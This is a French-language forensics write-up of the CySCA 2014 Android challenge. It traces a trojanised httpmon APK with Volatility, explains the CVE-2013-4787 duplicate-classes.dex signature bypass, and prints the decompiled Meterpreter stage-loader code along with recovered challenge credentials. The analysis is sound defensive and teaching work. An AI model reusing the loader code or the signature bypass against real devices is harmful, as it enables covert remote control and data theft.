# Solution du Cyber-Security Challenge Australia 2014 (Android Forensics)

De toutes les épreuves proposées par le *CySCA 2014*, il n'y a qu'une série d'épreuve qui n'évoquait strictement rien pour moi : l'épreuve d'inforensique Androïd.  

J'ai beau avoir quelques devices Androïd que j'utilise occasionnellement, je n'ai jamais pris la peine de fouiller ce système.  

C'était donc un voyage vers l'inconnu et je me suis parfois demandé ce que je faisais das cette galère :p  

Heureusement j'avais quelques numéros de *MISC* sous la main qui traitaient d'Androïd et m'ont aidé à connaître la structure d'un *APK* ou les fichiers potentiellement intéressants du système :)  

Pour ces épreuves les organisateurs nous ont laissé trois éléments :  

* un dump mémoire de 833Mo du système Androïd 4.1.2 utilisé (Kernel 2.6.29 Goldfish)
* un profil Volatility fonctionnel afin qu'on puisse conserver nos cheveux
* une archive 7z contenant le dossier framework de la partition */system*. On nous indique que ce sera nécessaire pour décompiler les binaires odex (version 16 de l'API Androïd)

Une fois que l'on a copié le plugin *Volatility* dans le dossier *plugins/overlays/linux/* on découvre que (wow!) effectivement la majorité [des commandes pour l'analyse d'image Linux](https://github.com/volatilityfoundation/volatility/wiki/Linux%20Command%20Reference) fonctionnent.  

Flappy Bird (120 points)
------------------------

Maintenant que l'on est rassurés on peut s'attaquer à la première question qui est la suivante :  

> Identify the suspicious app on the device  
> 
>   
> 
> a) Identify the PID of the suspicious app on the phone.  
> 
> b) What UID is associated with this process?  
> 
> c) When did the process start?  
> 
>   
> 
> Note the processes with PIDs 1454, 1461, 1468 are for dumping memory and can be ignored.  
> 
>   
> 
> Example answer format: [1234] [4321] [0000-00-00 00:00:00 UTC+0000]

*Volatility* nécessite de recevoir en paramètre le chemin du dump ainsi que le nom du profile utilisé.  

La commande *linux\_psaux* donne (comme son nom l'indique) une liste des processus en cours au moment de la création du dump :  

```plain
$ python vol.py linux_psaux -f memory.dmp --profile=Linuxgoldfish-2_6_29ARM
Volatility Foundation Volatility Framework 2.4
Pid    Uid    Gid    Arguments
1      0      0      /init
2      0      0      [kthreadd]
3      0      0      [ksoftirqd/0]
4      0      0      [events/0]
5      0      0      [khelper]
6      0      0      [suspend]
7      0      0      [kblockd/0]
8      0      0      [cqueue]
9      0      0      [kseriod]
10     0      0      [kmmcd]
11     0      0      [pdflush]
12     0      0      [pdflush]
13     0      0      [kswapd0]
14     0      0      [aio/0]
24     0      0      [mtdblockd]
25     0      0      [kstriped]
26     0      0      [hid_compat]
29     0      0      [rpciod/0]
30     0      0      [mmcqd]
31     0      0      /sbin/ueventd
32     1000   1000   /system/bin/servicemanager
33     0      0      /system/bin/vold
35     0      0      /system/bin/netd
36     0      0      /system/bin/debuggerd
37     1001   1001   /system/bin/rild
38     1000   1003   /system/bin/surfaceflinger
39     0      0      zygote /bin/app_process -Xzygote /system/bin --zygote --start-system-server
40     1019   1019   /system/bin/drmserver
41     1013   1005   /system/bin/mediaserver
42     0      0      /system/bin/installd
43     1017   1017   /system/bin/keystore /data/misc/keystore
44     0      0      /system/bin/qemud
47     2000   1007   /system/bin/sh
48     0      0      /sbin/adbd
220    1000   1000   system_server
276    10033  10033  com.android.systemui
308    1001   1001   com.android.phone
324    10014  10014  com.android.launcher
354    10010  10010  android.process.acore
462    10051  10051  com.outlook.Z7:engine
477    10036  10036  com.android.inputmethod.latin
530    10007  10007  android.process.media
554    10045  10045  com.twitter.android
568    10030  10030  com.android.email
671    10049  10049  com.lidroid.fileexplorer:bdservice_v1
727    10056  10056  local.weather.forecast.pro
928    10059  10059  com.estrongs.android.pop
959    10059  10059  /data/data/com.estrongs.android.pop/files/libestool2.so 39623 /data/data/com.estrongs.android.pop/files/comm/tool_port
975    10018  10018  com.android.packageinstaller
988    10029  10029  com.android.defcontainer
1003   10015  10015  com.svox.pico
1016   10057  10057  cm.aptoide.pt
1036   10006  10006  com.android.quicksearchbox
1095   10046  10046  com.devhd.feedly
1141   10052  10052  com.foobnix.pdf.reader
1185   10061  10061  org.jtb.httpmon
1221   10019  10019  com.android.mms
1255   10061  10061  sh
1321   10010  10010  com.android.contacts
1368   10047  10047  com.blueinfinity.photo
1420   1000   1000   com.android.settings
1454   0      0      /system/bin/sh -
1461   0      0      sh
1468   0      0      insmod lime.ko path=/sdcard/mem.dmp format=lime
```

Les process qui me semblent les plus anormaux sont les derniers... qu'il faut bien sûr ignorer :D  

A part ça je note la présence d'un *sh* (pid 1255), d'un *httpmon* (1185) et d'une librairie .so dans le dossier *com.estrongs.adroid.pop* (959).  

Mais là encore n'y connaissant rien il ne s'agit encore que d'un ressenti :p  

```plain
$ python vol.py linux_getcwd -f memory.dmp --profile=Linuxgoldfish-2_6_29ARM
Volatility Foundation Volatility Framework 2.4
Name              Pid      CWD
----------------- -------- ---
init                     1
kthreadd                 2
ksoftirqd/0              3
--- snip ---
drmserver               40
mediaserver             41
installd                42
keystore                43 /data/misc/keystore
qemud                   44
sh                      47
adbd                    48
--- snip ---
er.forecast.pro        727
ngs.android.pop        928
libestool2.so          959 /data/data/com.estrongs.android.pop/files
ackageinstaller        975
id.defcontainer        988
com.svox.pico         1003
cm.aptoide.pt         1016
.quicksearchbox       1036
om.devhd.feedly       1095
bnix.pdf.reader       1141
org.jtb.httpmon       1185
com.android.mms       1221
sh                    1255 /data/data/org.jtb.httpmon/files/a
ndroid.contacts       1321
einfinity.photo       1368
ndroid.settings       1420
sh                    1454
sh                    1461 /mnt/sdcard
insmod                1468 /mnt/sdcard
```

La commande *linux\_getcwd* donne (évidemment) le répertoire de travail de chaque process.  

Du coup le processus 1255 semble encore plus suspicieux et montre une relation directe entre le shell et l'application *httpmon*.  

La commande *linux\_pstree* permet d'obtenir une hiérarchie des processus mais ce qui se passe doit être assez générique pour du *Androïd* (on retrouve des *AsyncTask* à plusieurs endroits) :  

```plain
..AsyncTask #1       1200            10061
...sh                1255            10061
..AsyncTask #3       1213            10033
..AsyncTask #4       1214            10033
```

Sans compter que presque tous les process héritent du process [Zygote](http://anatomyofandroid.com/2013/10/15/zygote/)...  

Je décide d'approfondir la piste *httpmon*. La commande *linux\_lsof* offre des informations intéressantes :  

```plain
$ python vol.py linux_lsof -f memory.dmp --profile=Linuxgoldfish-2_6_29ARM -p 1185

Volatility Foundation Volatility Framework 2.4
Pid      FD       Path
-------- -------- ----
    1185        0 /dev/null
    1185        1 /dev/null
    1185        2 /dev/null
    1185        3 /dev/log/main
    1185        4 /dev/log/radio
    1185        5 /dev/log/events
    1185        6 /system/framework/core.jar
    1185        7 /system/framework/core-junit.jar
    1185        8 /dev/__properties__
    1185        9 /dev/binder
    1185       10 /system/framework/bouncycastle.jar
    1185       11 /system/framework/ext.jar
    1185       12 /system/framework/framework.jar
    1185       13 /system/framework/android.policy.jar
    1185       14 /system/framework/services.jar
    1185       15 /system/framework/apache-xml.jar
    1185       16 /system/framework/framework.jar
    1185       17 /system/framework/framework-res.apk
    1185       18 /system/etc/system_fonts.xml
    1185       19 /system/etc/fallback_fonts.xml
    1185       20 /system/framework/core.jar
    1185       21 /dev/urandom
    1185       22 pipe:[4570]
    1185       23 /dev/cpuctl/apps/tasks
    1185       24 /dev/cpuctl/apps/bg_non_interactive/tasks
    1185       25 socket:[4567]
    1185       26 pipe:[4568]
    1185       27 pipe:[4568]
    1185       28 pipe:[4570]
    1185       29 /anon_inode:/[eventpoll]
    1185       30 /dev/ashmem
    1185       31 /dev/ashmem
    1185       32 /data/app/org.jtb.httpmon-1.apk
    1185       33 /data/app/org.jtb.httpmon-1.apk
    1185       34 /data/app/org.jtb.httpmon-1.apk
    1185       35 pipe:[4586]
    1185       36 pipe:[4586]
    1185       37 /anon_inode:/[eventpoll]
    1185       38 socket:[4594]
    1185       39 /data/data/org.jtb.httpmon/files/UpdateService.jar
    1185       40 /data/data/org.jtb.httpmon/files/UpdateService.jar
    1185       41 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar
    1185       42 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar
    1185       43 /727/task/1538
    1185       46 /1185/task/1531
    1185       47 /data/org.jtb.httpmon/shared_prefs/org.jtb.httpmon_preferences.xml.bak
    1185       48 /1185/task/1531
    1185       49 pipe:[4791]
    1185       50 pipe:[4792]
    1185       51 []
    1185       52 pipe:[4793]
    1185       53 /727/task/1538
    1185       55 /meminfo
    1185       56 pipe:[6535]
    1185       58 pipe:[6535]
    1185       59 /anon_inode:/[eventpoll]
    1185       60 /system/batterystats.bin
```

Pas besoin d'être un expert Androïd pour soupçonner qu'une application légitime ne disposerait pas de fichier nommé *rathrazdaeizaztaxchj.jar* :p  

On retrouve la présence de ce fichier via la commande *linux\_proc\_maps* de *Volatility* (pour le process 1185) :  

```plain
1185 0x000000004b88f000 0x000000004b891000 r--       0x1d000     31      1       1063 /data/app/org.jtb.httpmon-1.apk
1185 0x000000004b891000 0x000000004b8aa000 r--           0x0     31      1       1094 /data/dalvik-cache/data@app@org.jtb.httpmon-1.apk@classes.dex
1185 0x000000004b8aa000 0x000000004b8c2000 r--           0x0     31      1       1240 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.dex
1185 0x000000004b8c2000 0x000000004b8c5000 rw-           0x0      0      7       4706 /dev/ashmem/dalvik-aux-structure
```

Au passage via *lsof* j'ai remarqué la présence d'un PDF ouvert via le lecteur PDF *Foobnix* (*com.foobnix.pdf.reader*) :  

```plain
1141       76 /mnt/sdcard/Download/Application_Whitelisting.pdf
```

L'une des commandes les plus intéressantes de *Volatility* est *linux\_find\_file* : elle permet de scanner en mémoire les fichiers mappés et retrouver l'inode à partir du path :  

```plain
$ python vol.py linux_find_file -f memory.dmp --profile=Linuxgoldfish-2_6_29ARM -F /data/app/org.jtb.httpmon-1.apk
Volatility Foundation Volatility Framework 2.4
Inode Number          Inode File Path
---------------- ---------- ---------
            1063 0xf370fe90 /data/app/org.jtb.httpmon-1.apk
```

Cette même commande permet en changeant les options (-i pour spécifier l'inode, -O pour la destination) d'extraire le contenu d'un fichier. Énorme :)  

Les fichiers ainsi extraits sont parfois corrompus mais contiennent suffisamment de données pour se rendre utiles.  

J'ai extrait un certains nombre de fichiers dont voici une liste rapide :  

```plain
1210 0xf36bc570 /data/data/org.jtb.httpmon/files/UpdateService.jar
1230 0xf35c82c0 /data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar
 621 0xf35f0740 /data/data/com.android.providers.telephony/databases/mmssms.db
 666 0xf35bbe90 /data/data/com.android.providers.telephony/databases/telephony.db
 505 0xf352cab8 /data/data/com.android.launcher/databases/launcher.db
 495 0xf3545ab8 /data/data/com.android.providers.contacts/databases/contacts2.db
 464 0xf369dc40 /data/data/com.android.providers.contacts/databases/profile.db
 783 0xf35c8d28 /data/data/com.outlook.Z7/databases/email.db
 551 0xf35d7eb0 /data/data/com.android.providers.downloads/databases/downloads.db
 815 0xf3717c20 /data/data/com.devhd.feedly/databases/webviewCookiesChromium.db
 609 0xf37218e8 /data/data/com.foobnix.pdf.reader/databases/webview.db
 481 0xf36a4b38 /data/data/org.jtb.httpmon/shared_prefs/org.jtb.httpmon_preferences.xml
```

Arrivé à ce stade il faut bien se décider à répondre aux premières questions.  

Ma réponse est la suivante :  

PID 1185 (le pid de *httpmon*)  

UID 10061 (le user id qui la fait tourner)  

DATE 2014-02-25 05:10:56  

La date de lancement de l'application se retrouve via la commande *linux\_pslist* :  

```plain
0xe102d800 org.jtb.httpmon      1185            10061           10061  0x21024000 2014-02-25 05:10:56 UTC+0000
```

Tower of Medivh (120 points)
----------------------------

> Provide the CVE for the vulnerability that was used to allow the installation of this package.  
> 
>   
> 
> Example answer format: [CVE-2000-0001]

J'ai été bien en peine sur cette question là...  

J'ai d'abord trouvé deux vulnérabilités qui touche *Estrongs File Explorer* présent sur le système :  

<http://www.securityfocus.com/bid/66384/info>  

<http://www.securityfocus.com/bid/52285/info>  

et deux pages toujours en rapport :  

<http://vuln.sg/esfileexplorer303-en.html>  

<https://stackoverflow.com/questions/30130186/how-to-load-a-library-as-root>  

Mais aucune ne permet l'installation de packages d'une manière où d'une autre...  

Comme souvent sur les épreuves d'inforensique il aura fallut aller plus loin dans les questions pour avoir une vision plus nette de ce qu'il s'est passé en totalité.  

C'est l'analyse du fichier */data/data/com.android.email/databases/EmailProviderBody.db* qui m'a mis la puce à l'oreille.  

Ce fichier contient les emails reçus mais est corrompu et en partie inexploitable avec *sqlite3* mais un *strings* se montre efficace pour avancer sur les questions :  

> Hi Kevin,  
> 
>   
> 
> I'm a big fan of your site and I saw that your it went down over the weekend! :( If you want a good  
> 
> application to monitor this kind of activity you should use httpmon  
> 
> (http://www.megafileupload.com/en/file/502128/org-jtb-httpmon-apk.html); it's signed by the  
> 
> author if your worried about rogue apps ;)  
> 
>   
> 
> Let me know if you have any problems!  
> 
>   
> 
> Mike

On apprend soudainement beaucoup de choses. Principalement que *httpmon* est une application normalement légitime ([trouvable sur le *Play Store*](https://play.google.com/store/apps/details?id=org.jtb.httpmon)) mais que vraisemblablement ce *Mike* l'a vérolé et a utilisé un peu d'ingénierie sociale pour parvenir à ses fins.  

L'information qui nous intéresse pour la question c'est le fait que *Mike* indique que l'application est signée par l'auteur...  

Dès lors comment *Mike* a t-il réussi à véroler l'application ?  

Tout s'explique par la vulnérabilité [CVE-2013-4787](http://www.cvedetails.com/cve/CVE-2013-4787/).  

[*Sophos* explique très bien](https://nakedsecurity.sophos.com/2013/07/10/anatomy-of-a-security-hole-googles-android-master-key-debacle-explained/) le principe de la vulnérabilité (depuis corrigée) : un *APK* est simplement un zip organisé d'une manière prédéfinie.  

Androïd vérifie au fur et à mesure de sa lecture des signatures pour chaque fichier listé dans le zip (les signatures sont dans *META-INF/MANIFEST.MF* lui-même compressé).  

Seulement le format zip permet de spécifier deux fois le même fichier... et Androïd fait la vérification de signature sur la première occurence d'un fichier alors qu'il écrase cette occurence si une autre est présente !  

C'est facilement vérifiable avec l'utilitaire unzip :  

```plain
$ unzip -l org.jtb.httpmon-1.apk
Archive:  org.jtb.httpmon-1.apk
  Length      Date    Time    Name
---------  ---------- -----   ----
    98532  2014-02-21 06:42   classes.dex
     2156  2010-11-27 15:28   res/drawable/icon.png
     1408  2010-11-27 15:28   res/drawable/invalid.png
     1328  2010-11-27 15:28   res/drawable/running.png
     1299  2010-11-27 15:28   res/drawable/status.png
     1311  2010-11-27 15:28   res/drawable/stopped.png
     1470  2010-11-27 15:28   res/drawable/valid.png
      872  2010-11-27 15:29   res/layout/action_row.xml
      892  2010-11-27 15:29   res/layout/condition_row.xml
     2768  2010-11-27 15:29   res/layout/edit_content_contains_condition.xml
     3084  2010-11-27 15:29   res/layout/edit_header_contains_condition.xml
     4984  2010-11-27 15:29   res/layout/edit_monitor.xml
     3072  2010-11-27 15:29   res/layout/edit_notification_action.xml
     1820  2010-11-27 15:29   res/layout/edit_request.xml
     1560  2010-11-27 15:29   res/layout/edit_response_code_condition.xml
     1752  2010-11-27 15:29   res/layout/edit_response_time_condition.xml
     2608  2010-11-27 15:29   res/layout/edit_sms_action.xml
      660  2010-11-27 15:29   res/layout/log.xml
     1100  2010-11-27 15:29   res/layout/manage_monitors.xml
     2292  2010-11-27 15:29   res/layout/monitor_row.xml
     2284  2010-11-27 15:29   res/layout/prefs.xml
     6264  2010-11-27 15:29   AndroidManifest.xml
    10808  2010-11-27 15:28   resources.arsc
    94328  2010-11-27 15:29   classes.dex
     1900  2010-11-27 15:29   META-INF/MANIFEST.MF
     1953  2010-11-27 15:29   META-INF/CERT.SF
      937  2010-11-27 15:29   META-INF/CERT.RSA
---------                     -------
   253442                     27 files
```

On observe ici deux fois le fichier *classes.dex*. Le plus agé est l'original (avec la signature valide) et le second (daté de 2014 et plus volumineux) est celui piégé.  

Wrath (180 points)
------------------

> Identify additional payload stages  
> 
>   
> 
> a) What are the file paths for the second and third Java stages of the malware?  
> 
> b) What are the file sizes of these two files (in bytes)?  
> 
> c) What is the publicly named malware used in both stages?  
> 
>   
> 
> Example answer format: [/dir/dir/filename1.ext | /dir/dir/filename2.ext] [12345 | 54321] [MalwareRAT]

Les questions a et b sont facile à résoudre une fois que l'on a extrait les fichiers de la mémoire :  

/data/data/org.jtb.httpmon/files/UpdateService.jar (1993 octets)  

/data/data/org.jtb.httpmon/files/rathrazdaeizaztaxchj.jar (37661 octets)  

Comment procéder pour lire ces fichiers JAR :  

Une archive JAR est juste une archive zip, on l'ouvre donc avec unzip.  

A l'intérieur on trouve un fichier .dex que l'on peut convertir (à son tour) en .jar via le logiciel [dex2jar](https://github.com/pxb1988/dex2jar).  

Inutile de décompresser le .jar résultant qui contient les .class. On le passe directement au décompilateur [JD](http://jd.benow.ca/) (*JD-GUI*) qui en fait son affaire.  

Ainsi on trouve le code suivant dans *UpdateService.jar* :  

```java
package androidpayload.stage;

import android.content.Context;
import dalvik.system.DexClassLoader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.util.Random;

public class Meterpreter
  implements Stage
{
  private String randomJarName()
  {
    char[] arrayOfChar = "abcdefghijklmnopqrstuvwxyz".toCharArray();
    StringBuilder localStringBuilder = new StringBuilder();
    Random localRandom = new Random();
    int i = 0;
    while (i < 20)
    {
      localStringBuilder.append(arrayOfChar[localRandom.nextInt(arrayOfChar.length)]);
      i += 1;
    }
    return localStringBuilder.toString() + ".jar";
  }

  public void start(DataInputStream paramDataInputStream, OutputStream paramOutputStream, Context paramContext, String[] paramArrayOfString)
    throws Exception
  {
    paramArrayOfString = randomJarName();
    String str = paramContext.getFilesDir().getAbsolutePath();
    byte[] arrayOfByte = new byte[paramDataInputStream.readInt()];
    paramDataInputStream.readFully(arrayOfByte);
    FileOutputStream localFileOutputStream = paramContext.openFileOutput(paramArrayOfString, 0);
    localFileOutputStream.write(arrayOfByte);
    localFileOutputStream.close();
    new DexClassLoader(str + File.separatorChar + paramArrayOfString, str, str, paramContext.getClassLoader()).loadClass("com.metasploit.meterpreter.AndroidMeterpreter").getConstructor(new Class[] { DataInputStream.class, OutputStream.class, Context.class, Boolean.TYPE }).newInstance(new Object[] { paramDataInputStream, paramOutputStream, paramContext, Boolean.valueOf(false) });
  }
}
```

*UpdateService.jar* est donc le second stage et *rathrazdaeizaztaxchj.jar* le third stage.  

Quand au nom connu du malware correspondant à ces deux stages c'est simplement le *Meterpreter* de *Metasploit* :)  

Scams Through The Portal (180 points)
-------------------------------------

> Investigate the attack vector  
> 
>   
> 
> a) Provide the full path to the malicious app's original location on the phone.  
> 
> b) Provide the IP for where the malware was initially downloaded.  
> 
> c) What is the email address of the person who is responsible for this compromise?  
> 
>   
> 
> Example answer format: [/dir/dir/filename.ext] [127.0.0.1] [email@domain.com]

La commande *linux\_dentry\_cache* de *Volatility* peut prendre du temps à s'exécuter mais vaut la peine d'attendre.  

On retrouve facilement l'emplacement initial du apk malicieux :  

```plain
0|Download/[Megafileupload]org.jtb.httpmon.apk|174|0|1000|1015|124408|4084033896|4084033904|0|4084033912
```

Et dans le fichier *downloads.db* extrait plus tôt on retrouve des informations complémentaires :  

```plain
sqlite> select * from downloads;
1|http://172.16.1.80/img/people/kevin.jpg|0|||file:///mnt/sdcard/Download/kevin.jpg||/mnt/sdcard/Download/kevin.jpg|image/jpeg|4||0||200|0|1392952454780|com.android.browser||||||31137|31137|"40b91-79a1-4f2e200d89141"|10004||kevin.jpg|172.16.1.80|1|1|1|-1|1|0|content://media/external/images/media/12|0||1
2|http://www.asd.gov.au/publications/csocprotect/Application_Whitelisting.pdf|0|||file:///mnt/sdcard/Download/Application_Whitelisting.pdf||/mnt/sdcard/Download/Application_Whitelisting.pdf|application/pdf|4||1||200|0|1393205837399|com.android.browser||||||449709|449709|"6ddda-6dcad-4d13c72f8e600"|10004||Application_Whitelisting.pdf|www.asd.gov.au|1|1|1|-1|1|0|content://media/external/file/157|0||1
3|http://212.7.194.85/getfile.php?id=502128&access_key=af1a5e52710db24b96bd6b0fd889c7c5&t=530c1c39&o=C7AA675A03F1AD70CF8FEFF381EA8B85C7B6645A03EDB070CF8FE3EF87BCD88694B07A5B6CBCEC37D3F694F380F68D99&name=org.jtb.httpmon.apk|0|||file:///mnt/sdcard/Download/[Megafileupload]org.jtb.httpmon.apk|||application/octet-stream|4||1||495|0|1393304677898|com.android.browser||||||-1|0||10004|||212.7.194.85||1|1|-1|1|0||0|can't know size of download, giving up|1
4|http://212.7.194.85/getfile.php?id=502128&access_key=142e7aafe3f38db049c9841c9fd2263d&t=530c1cf3&o=C7AA675A03F1AD70CF8FEFF381EA8B85C7B6645A03EDB070CF8FE3EF87BCD88694B07A5B6CBCEC37D3F694F380F68D99&name=org.jtb.httpmon.apk|0|||file:///mnt/sdcard/Download/[Megafileupload]org.jtb.httpmon.apk||/mnt/sdcard/Download/[Megafileupload]org.jtb.httpmon.apk|application/octet-stream|4||1||200|0|1393304784497|com.android.browser||||||124408|124408||10004||[Megafileupload]org.jtb.httpmon.apk|212.7.194.85|1|1|1|-1|1|0|content://media/external/file/169|0||1
```

On sait donc que le fichier a été téléchargé depuis le serveur *212.7.194.85*. Ce serveur appartient à *MegaFileUpload*, un service toujours d'actualité malheureusement suite à une restructuration l'APK n'est plus téléchargeable (38 personnes auront au la chance de le récupérer tel quel, probablement quand le challenge était actif).  

Pour la question c on dispose déjà en partie de la réponse mais le fichier */data/data/com.android.email/databases/EmailProvider.db* donne d'autres informations intéressantes :  

```plain
sqlite> select * from Account;
1|k3vin.saunders@gmail.com|k3vin.saunders@gmail.com||-1|15|1|2|2313|0|cc963c62-5175-48a8-a6fd-7e7e18316a44|Kevin Saunders|content://settings/system/notification_sound||0||||0|0|0
sqlite> select * from HostAuth;
1|imap|imap.gmail.com|993|5|k3vin.saunders@gmail.com|superkev||0|
2|smtp|smtp.gmail.com|465|5|k3vin.saunders@gmail.com|superkev||0|
sqlite> select * from Message;
1|4|1392078696000|Google+ team|1392078695000|Getting started on Google+|0|1|0|0|0||<CKDeuaHpwrwCFYZycgodTYAAAA@plus.google.com>|9|1|Google+ team <noreply-daa26fef@plus.google.com>|k3vin.saunders@gmail.com|||||Welcome to Google+, Kevin!Share with the people you care about, and explore the stuff you're into.Go to Google+Share and stay in touch with just the right peopleEnhance and back up your photos automat||
2|5|1392087497000|Twitter|1392087494000|Confirm your Twitter account, K3vinSaunders!|1|1|0|0|0||<BC.EB.02656.6C199F25@spruce-goose.twitter.com>|9|1|Twitter <confirm@twitter.com>|Kevin Saunders <k3vin.saunders@gmail.com>|||||Kevin Saunders, Please confirm your Twitter account Confirming your account will give you full access to Twitter and all future notifications will be sent to this email address. Confirm your account n||
3|6|1392379137000|Twitter|1392379134000|Confirm your Twitter account, K3vinSaunders!|0|1|0|0|0||<82.23.05397.EF40EF25@spruce-goose.twitter.com>|9|1|Twitter <confirm@twitter.com>|Kevin Saunders <k3vin.saunders@gmail.com>|||||Kevin Saunders, Please confirm your Twitter account Confirming your account will give you full access to Twitter and all future notifications will be sent to this email address. Confirm your account n||
4|7|1392529476000|Twitter|1392529474000|Confirm your Twitter account, K3vinSaunders!|0|1|0|0|0||<1A.D5.56395.24050035@spruce-goose.twitter.com>|9|1|Twitter <confirm@twitter.com>|Kevin Saunders <k3vin.saunders@gmail.com>|||||Kevin Saunders, Please confirm your Twitter account Confirming your account will give you full access to Twitter and all future notifications will be sent to this email address. Confirm your account n||
5|8|1392889021000|Twitter|1392889019000|Confirm your Twitter account, K3vinSaunders!|0|1|0|0|0||<1C.EA.56249.BBCC5035@spruce-goose.twitter.com>|9|1|Twitter <confirm@twitter.com>|Kevin Saunders <k3vin.saunders@gmail.com>|||||Kevin Saunders, Please confirm your Twitter account Confirming your account will give you full access to Twitter and all future notifications will be sent to this email address. Confirm your account n||
6|1|1393155939000|Me|1393154502553|Remember meeting tomorrow 8:00 <eom>|1|1|0|0|131072||<xdekarfhdn5x0kqwksk0fims.1393154502553@email.android.com>|11|1|k3vin.saunders@gmail.comKevin Saunders|Me <k3vin.saunders@gmail.com>|||||||
7|9|1393155068000|Kevin Saunders|1393154502000|Remember meeting tomorrow 8:00 <eom>|0|1|0|0|0||<xdekarfhdn5x0kqwksk0fims.1393154502553@email.android.com>|9|1|Kevin Saunders <k3vin.saunders@gmail.com>|Me <k3vin.saunders@gmail.com>|||||||
8|10|1393209801000|mike.joss@hushmail.com|1393209799000|RE: Website downtime :(|1|1|0|0|0||<20140224024319.AEDBF206E4@smtp.hushmail.com>|9|1|mike.joss@hushmail.com|k3vin.saunders@gmail.com|||||Hi Kevin,I'm a big fan of your site and I saw that your it went down over the weekend! :( If you want a good application to monitor this kind of activity you should use httpmon (http://www.megafileupl||
```

N'est-ce pas *mike.joss@hushmail.com* ?  

hunter2 (200 points)
--------------------

> Information on files exfiltrated  
> 
>   
> 
> a) Where were the files copied to before they were stolen?  
> 
> b) What were the credentials that were stolen?  
> 
> c) What was the full path to the PDF document that was exfiltrated?  
> 
>   
> 
> Example answer format: [/dir/dir/stagedir/] [username/password] [/dir/dir/filename.ext]

On quitte donc la partie *"comment c'est arrivé"* pour la partie *"que s'est t-il passé..."*  

La présence du processus sh dans le dossier de l'APK backdooré indique que le pirate a récupéré un shell depuis le *Meterpreter*.  

J'ai eu recours à la commande *linux\_proc\_maps* de *Volatility* pour lister les zones mémoires du processus shell :  

```bash
python vol.py linux_proc_maps -f memory.dmp --profile=Linuxgoldfish-2_6_29ARM -p 1255
```

C'est dans le heap que j'ai trouvé le plus d'informations intéressantes :  

```bash
python vol.py linux_dump_map -f memory.dmp --profile=Linuxgoldfish-2_6_29ARM -p 1255 -s 0x00000000beb41000 -D /tmp/output
```

Un *strings* retourne les informations (relativement) lisibles suivantes :  

```plain
card/Download/kevin.jpg > ./k
listing.pdf > ./a
*/data/data/org.jtb.httpmon/files/a
CDPATH
*/data/data/org.jtb.httpmon/files/a
netstat
*/system/bin/netstat
mkdir
*/system/bin/rm
*/data/data/org.jtb.httpmon/files
ls -l
ard/Download/
@ystem/bin/rm
@yste
*/system/bin/ps
*_=/system/bin/ls
@rg.jA
ttpmon/files
netstat
*nets
ard/y
*/system/bin/rm
Username: kevins
Password: s1mpl!c17y
Account active for 12 mon
*/sdcard/Download
in.jpg
*./k
```

Les fichiers volés ont été copiés dans le dossier */data/data/org.jtb.httpmon/files/a/*.  

Pour le savoir il faut croiser l'output précédent avec le résultat de la commande *dentry* :  

```plain
0|data/org.jtb.httpmon/files/a|789|0|10061|10061|2048|4084386000|4084386008|0|4084386016
0|data/org.jtb.httpmon/files/a/a|0|0|0|0|0|0|0|0
0|data/org.jtb.httpmon/files/a/k|0|0|0|0|0|0|0|0
0|data/org.jtb.httpmon/files/a/p|0|0|0|0|0|0|0|0
```

Bien que l'on voit un username et password on ne sait pas à quoi ils servent.  

Une simple recherche sur ces infos dans le dump mémoire nous donne un extrait plus complet :  

```plain
Usenet Account information:
Username: kevins
Password: s1mpl!c17y
Account active for 12 months.
```

Quand au PDF exfiltré il n'y en a pas beaucoup finissant par *listing.pdf* :  

```plain
/mnt/sdcard/Download/Application_Whitelisting.pdf
```

Electronic Sheep (230 points)
-----------------------------

> Analysis on the malicious application  
> 
>   
> 
> a) What is the malicious domain and port associated with the malware?  
> 
> b) What is the existing Class method (Java) that was modified to jump to the malicious code?  
> 
>   
> 
> Example answer format: [domain.com:1234] [methodName()]

On rentre cette fois dans les détails avec cette dernière question.  

On a beau remarquer que le pirate a utilisé *netstat* (potentiellement plusieurs fois mais vu la structure du heap pas sûr) on ne trouve pas pour autant d'adresses IP dans le dump mémoire :'(  

Qui plus est, la commande *linux\_netstat* de *Volatility* est restée désespérément silencieuse.  

La commande *linux\_route\_cache* retourne la liste suivante :  

```plain
Interface        Destination          Gateway
---------------- -------------------- -------
eth0             95.211.162.18        10.0.2.2
eth0             74.125.237.203       10.0.2.2
eth0             74.125.237.202       10.0.2.2
eth0             54.225.150.210       10.0.2.2
eth0             10.0.2.3             10.0.2.3
lo               10.0.2.15            10.0.2.15
lo               0.0.0.0              0.0.0.0
eth0             54.243.82.218        10.0.2.2
eth0             107.22.187.100       10.0.2.2
eth0             74.125.237.170       10.0.2.2
eth0             173.194.79.108       10.0.2.2
eth0             74.125.237.172       10.0.2.2
eth0             107.22.187.100       10.0.2.2
lo               10.0.2.15            10.0.2.15
eth0             74.125.237.171       10.0.2.2
lo               10.0.2.15            10.0.2.15
eth0             74.125.237.204       10.0.2.2
eth0             107.22.211.9         10.0.2.2
eth0             10.0.2.3             10.0.2.3
eth0             173.194.79.109       10.0.2.2
eth0             74.125.237.202       10.0.2.2
lo               10.0.2.15            10.0.2.15
lo               10.0.2.15            10.0.2.15
eth0             74.125.129.109       10.0.2.2
eth0             192.168.43.221       10.0.2.2
lo               10.0.2.15            10.0.2.15
eth0             192.168.43.221       10.0.2.2
eth0             75.101.143.120       10.0.2.2
eth0             74.125.237.203       10.0.2.2
eth0             54.243.77.51         10.0.2.2
eth0             184.73.220.212       10.0.2.2
eth0             184.73.220.212       10.0.2.2
eth0             75.101.143.120       10.0.2.2
eth0             8.8.8.8              10.0.2.2
eth0             107.22.211.9         10.0.2.2
eth0             54.243.77.51         10.0.2.2
eth0             173.194.79.108       10.0.2.2
lo               10.0.2.15            10.0.2.15
lo               10.0.2.15            10.0.2.15
eth0             54.243.82.218        10.0.2.2
lo               10.0.2.15            10.0.2.15
eth0             54.243.43.116        10.0.2.2
eth0             54.225.150.210       10.0.2.2
eth0             74.125.237.172       10.0.2.2
eth0             8.8.8.8              10.0.2.2
lo               10.0.2.15            10.0.2.15
eth0             173.194.79.109       10.0.2.2
eth0             54.243.43.116        10.0.2.2
```

Après quelques *Whois* on détermine la répartition suivante :  

```plain
173.194 => google
74.125 => google
54.* => amazon AWS
107.22 => amazon AWS
